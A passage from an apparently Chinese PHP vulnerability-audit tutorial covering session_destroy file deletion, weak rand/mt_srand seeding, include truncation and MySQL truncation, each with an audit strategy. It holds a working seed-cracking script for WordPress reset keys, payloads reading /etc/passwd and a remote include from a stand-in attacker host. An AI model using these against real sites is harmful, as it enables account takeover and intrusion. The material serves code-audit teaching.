title="PHP函数的其他漏洞"></a>PHP函数的其他漏洞</h3><p>Stefan Esser大牛发现的漏洞：unset()–Zend_Hash_Del_Key_Or_Index Vulnerability<br>​<br>比如phpwind早期的serarch.php里的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>($uids);</span><br><span class="line">......</span><br><span class="line">$query=$db-&gt;query(<span class="string">"SELECT uid FROM pw_members WHERE username LIKE '$pwuser'"</span>);</span><br><span class="line"><span class="keyword">while</span>($member=$db-&gt;fetch_array($query))&#123;</span><br><span class="line">$uids .= $member[<span class="string">'uid'</span>].<span class="string">','</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uids ? $uids=substr($uids,<span class="number">0</span>,<span class="number">-1</span>) : $sqlwhere.=<span class="string">' AND 0 '</span>;</span><br><span class="line">........</span><br><span class="line">$query = $db-&gt;query(<span class="string">"SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"</span>);</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4&lt;4.3 php5&lt;5.14</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找unset</td></tr></tbody></table><h3 id="session-destroy-删除文件漏洞"><a href="#session-destroy-删除文件漏洞" class="headerlink" title="session_destroy()删除文件漏洞"></a>session_destroy()删除文件漏洞</h3><p><em>测试PHP版本：5.1.2</em><br>​<br>这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//val.php   </span></span><br><span class="line">session_save_path(<span class="string">'./'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'del'</span>]) &#123;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$_SESSION[<span class="string">'hei'</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span>(session_id());</span><br><span class="line">print_r($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink(‘sess<code>_</code>/../1.php’)这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：具体不详</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找session_destroy</td></tr></tbody></table><h3 id="随机函数"><a href="#随机函数" class="headerlink" title="随机函数"></a>随机函数</h3><p><em>1) rand() VS mt_rand()</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//on windows</span></span><br><span class="line"><span class="keyword">print</span> mt_getrandmax(); <span class="comment">//2147483647</span></span><br><span class="line"><span class="keyword">print</span> getrandmax();<span class="comment">// 32767</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a= md5(rand());</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">32767</span>;$i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(md5($i) ==$a ) &#123;</span><br><span class="line">   <span class="keyword">print</span> $i.<span class="string">"--&gt;ok!! |</span></span><br><span class="line"><span class="string">| "</span>;<span class="keyword">exit</span>;</span><br><span class="line">   &#125;<span class="keyword">else</span> &#123; <span class="keyword">print</span> $i.<span class="string">" |</span></span><br><span class="line"><span class="string">| "</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找rand</td></tr></tbody></table><p><em>2) mt_srand()/srand()-weak seeding（by Stefan Esser）</em></p><p>看php手册里的描述：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mt_srand</span><br><span class="line">(PHP <span class="number">3</span> &gt;= <span class="number">3.0</span><span class="number">.6</span>, PHP <span class="number">4</span>, PHP <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">mt_srand -- 播下一个更好的随机数发生器种子</span><br><span class="line">说明</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mt_srand</span> <span class="params">( <span class="keyword">int</span> seed )</span></span></span><br></pre></td></tr></table></figure><p>用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。 </p><p>例子 1. mt_srand() 范例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// seed with microseconds</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_seed</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($usec, $sec) = explode(<span class="string">' '</span>, microtime());</span><br><span class="line">    <span class="keyword">return</span> (float) $sec + ((float) $usec * <span class="number">100000</span>);</span><br><span class="line">&#125;</span><br><span class="line">mt_srand(make_seed());</span><br><span class="line">$randval = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>_注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已自动完成。_</p><p>php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt_srand ((<span class="keyword">double</span>) microtime() * <span class="number">1000000</span>)</span><br></pre></td></tr></table></figure><p>但是使用(double)microtime()<code>*</code>1000000类似的代码seed是比较脆弱的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()&lt;<span class="number">1</span> ---&gt; <span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()* <span class="number">1000000</span>&lt;<span class="number">1000000</span></span><br></pre></td></tr></table></figure><p>那么很容易暴力破解,测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/////////////////</span></span><br><span class="line"><span class="comment">//&gt;php rand.php</span></span><br><span class="line"><span class="comment">//828682</span></span><br><span class="line"><span class="comment">//828682</span></span><br><span class="line"><span class="comment">////////////////</span></span><br><span class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="number">0</span>);</span><br><span class="line">$time=(double) microtime()* <span class="number">1000000</span>;</span><br><span class="line"><span class="keyword">print</span> $time.<span class="string">"\n"</span>;</span><br><span class="line">mt_srand ($time);</span><br><span class="line"></span><br><span class="line">$search_id = mt_rand();</span><br><span class="line">$seed = search_seed($search_id);</span><br><span class="line"><span class="keyword">print</span> $seed;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">search_seed</span><span class="params">($rand_num)</span> </span>&#123;</span><br><span class="line">$max = <span class="number">1000000</span>;</span><br><span class="line"><span class="keyword">for</span>($seed=<span class="number">0</span>;$seed&lt;=$max;$seed++)&#123;</span><br><span class="line">mt_srand($seed);</span><br><span class="line">$key = mt_rand();</span><br><span class="line"><span class="keyword">if</span>($key==$rand_num) <span class="keyword">return</span> $seed;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：</p><table><thead><tr><th style="text-align:left">例A</th></tr></thead><tbody><tr><td style="text-align:left"><em>seed-A</em></td></tr><tr><td style="text-align:left">mt_rand-A-1</td></tr><tr><td style="text-align:left">mt_rand-A-2</td></tr><tr><td style="text-align:left">mt_rand-A-3</td></tr></tbody></table><table><thead><tr><th style="text-align:left">例B</th></tr></thead><tbody><tr><td style="text-align:left"><em>seed-B</em></td></tr><tr><td style="text-align:left">mt_rand-B-1</td></tr><tr><td style="text-align:left">mt_rand-B-2</td></tr><tr><td style="text-align:left">mt_rand-B-3</td></tr></tbody></table><p>对于seed-A里mt_rand-1/2/3都是不相等的，但是值都是特定的，也就是说当seed-A等于seed-B，那么mt_rand-A-1就等于mt_rand-B-1…，这样我们只要能够得到seed就可以得到每次mt_rand的值了。</p><p>对于5.2.6&gt;php&gt;4.2.0直接使用默认播种的程序也是不安全的（很多的安全人员错误的以为这样就是安全的），这个要分两种情况来分析：</p><p>第一种：’Cross Application Attacks’，这个思路在Stefan Esser文章里有提到，主要是利用其他程序定义的播种（如mt_srand ((double) microtime()<code>*</code> 1000000)），phpbb+wordpree组合就存在这样的危险.</p><p>第二种：5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，这是Stefan Esser的文章里的描述：<br>The Implementation</p><blockquote><p>When mt_rand() is seeded internally or by a call to mt_srand() PHP 4 and PHP 5 &lt;= 5.2.0 force the lowest bit to 1. Therefore the strength of the seed is only 31 and not 32 bits. In PHP 5.2.1 and above the implementation of the Mersenne Twister was changed and the forced bit removed.</p></blockquote><p>在32位系统上默认的播种的种子为最大值是<code>2^32</code>，这样我们循环最多<code>2^32</code>次就可以破解seed。而在PHP 4和PHP 5 &lt;= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录 [3] ）,测试代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">4</span>); </span><br><span class="line">$a = mt_rand(); </span><br><span class="line">mt_srand(<span class="number">5</span>); </span><br><span class="line">$b = mt_rand();</span><br><span class="line"><span class="keyword">print</span> $a.<span class="string">"\n"</span>.$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//base on http://www.milw0rm.com/exploits/6421 </span></span><br><span class="line"><span class="comment">//test on php 5.2.0</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'BUGGY'</span>, <span class="number">1</span>); <span class="comment">//上面代码$a==$b时候定义BUGGY=1</span></span><br><span class="line"></span><br><span class="line">$key = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> $key.<span class="string">"\n"</span>;</span><br><span class="line">$seed = getseed($key);</span><br><span class="line"><span class="keyword">print</span> $seed.<span class="string">"\n"</span>; </span><br><span class="line"></span><br><span class="line">mt_srand($seed);</span><br><span class="line">$pass = wp_generate_password(<span class="number">20</span>, <span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">echo</span> $pass.<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">($length = <span class="number">12</span>, $special_chars = true)</span> </span>&#123;</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"><span class="keyword">if</span> ( $special_chars )</span><br><span class="line">$chars .= <span class="string">'!@#$%^&amp;*()'</span>;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">$password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> $password;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getseed</span><span class="params">($resetkey)</span> </span>&#123;</span><br><span class="line">$max = pow(<span class="number">2</span>,(<span class="number">32</span>-BUGGY));</span><br><span class="line"><span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;=$max;$x++) &#123;</span><br><span class="line">$seed = BUGGY ? ($x &lt;&lt; <span class="number">1</span>) + <span class="number">1</span> : $x; </span><br><span class="line">mt_srand($seed);</span><br><span class="line">$testkey = wp_generate_password(<span class="number">20</span>,<span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">if</span>($testkey==$resetkey) &#123; <span class="keyword">echo</span> <span class="string">"o\n"</span>; <span class="keyword">return</span> $seed; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($x % <span class="number">10000</span>)) <span class="keyword">echo</span> $x / <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">php5&gt;</span><span class="bash">php rand.php</span></span><br><span class="line">M8pzpjwCrvVt3oobAaOr</span><br><span class="line">0123456789101112131415161718192021222324252627282930313233343536373839404142434</span><br><span class="line">445464748495051525354555657585960616263646566676869</span><br><span class="line">7071727374757677787980818283848586878889909192939495969798991001011021031041051</span><br><span class="line">061071081091101111121131141151161171181191201211221</span><br><span class="line">2312412512612712812913013113213313413513613713813914014114214314414514614714814</span><br><span class="line">915015115215315415515615715815916016116216316416516</span><br><span class="line">6167168169170171172173174175176177178179180181182183184185186187188189190191192</span><br><span class="line">193194195196197198199200201202203204205206207208209</span><br><span class="line">2102112122132142152162172182192202212222232242252262272282292302312322332342352</span><br><span class="line">362372382392402412422432442452462472482492502512522</span><br><span class="line">..............01062110622106231062410625106261062710628106291063010631106321063</span><br><span class="line">3o</span><br><span class="line">70693</span><br><span class="line">pjwCrvVt3oobAaOr</span><br></pre></td></tr></table></figure><p>当10634次时候我们得到了结果。</p><p>当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">42</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand();</span><br><span class="line"><span class="comment">//php&lt;=5.20 1387371436</span></span><br><span class="line"><span class="comment">//php&gt;5.20 1354439493 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。</p><p>从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。</p><p>很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：php4 php5&lt;5.2.6</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：查找mt_srand/mt_rand</td></tr></tbody></table><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><hr><p>其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：</p><h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>其中最有名的数大家都熟悉的null字符截断。</p><h4 id="include截断"><a href="#include截断" class="headerlink" title="include截断"></a>include截断</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'action'</span>].<span class="string">".php"</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=<code>http://www.hacksite.com/evil-code.txt</code>?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">////////////////////</span></span><br><span class="line"><span class="comment">////var5.php代码:</span></span><br><span class="line"><span class="comment">////include $_GET['action'].".php"; </span></span><br><span class="line"><span class="comment">////print strlen(realpath("./"))+strlen($_GET['action']);  </span></span><br><span class="line"><span class="comment">///////////////////</span></span><br><span class="line">ini_set(<span class="string">'max_execution_time'</span>, <span class="number">0</span>);</span><br><span class="line">$str=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">50000</span>;$i++)</span><br><span class="line">&#123;</span><br><span class="line">$str=$str.<span class="string">"/"</span>;</span><br><span class="line"></span><br><span class="line">$resp=file_get_contents(<span class="string">'http://127.0.0.1/var/var5.php?action=1.txt'</span>.$str);</span><br><span class="line"><span class="comment">//1.txt里的代码为print 'hi';</span></span><br><span class="line"><span class="keyword">if</span> (strpos($resp, <span class="string">'hi'</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">print</span> $i;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和<code>*</code>nix的系统长度不一样，当win下strlen(realpath(“./“))+strlen($<code>_</code>GET<code>[&#39;action&#39;]</code>)的长度大于256时被截断，对于<code>*</code>nix的长度是4 <code>*</code> 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）</p><h4 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h4><p>对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。</p><p><em>1) Mysql SQL Column Truncation Vulnerabilities</em></p><p>这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：<br>​    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from truncated_test;</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">| id | username   | password |</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">| 1 | admin      | pass     |</span><br><span class="line">| 2 | admin      | new_pass |</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><em>2) Mysql charset Truncation vulnerability</em></p><p>这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：<br>​    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from truncated_test;</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">| id | username   | password |</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">| 1 | admin      | pass      |</span><br><span class="line">| 2 | admin      | new_pass  |</span><br><span class="line">| 3 | admin      | new_pass2 |</span><br><span class="line">+<span class="comment">----+------------+----------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$result = mysql_query(<span class="string">"SELECT * from test_user where user='$user' "</span>);</span><br><span class="line">  ....</span><br><span class="line"><span class="keyword">if</span>(@mysql_fetch_array($result, MYSQL_NUM)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"already exist"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h4 id="文件操作里的特殊字符"><a href="#文件操作里的特殊字符" class="headerlink" title="文件操作里的特殊字符"></a>文件操作里的特殊字符</h4><p>文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“...\”进行系统转跳等等。<br>​<br>下面还给大家介绍一个非常有意思的问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Is this code vul?</span></span><br><span class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"ERR"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</span><br><span class="line">.....</span><br><span class="line">header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);</span><br></pre></td></tr></table></figure><p>很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</span><br><span class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"ERR"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++) &#123;</span><br><span class="line">$url = <span class="string">'1.ph'</span>.chr($i);</span><br><span class="line">$tmp = @file_get_contents($url);</span><br><span 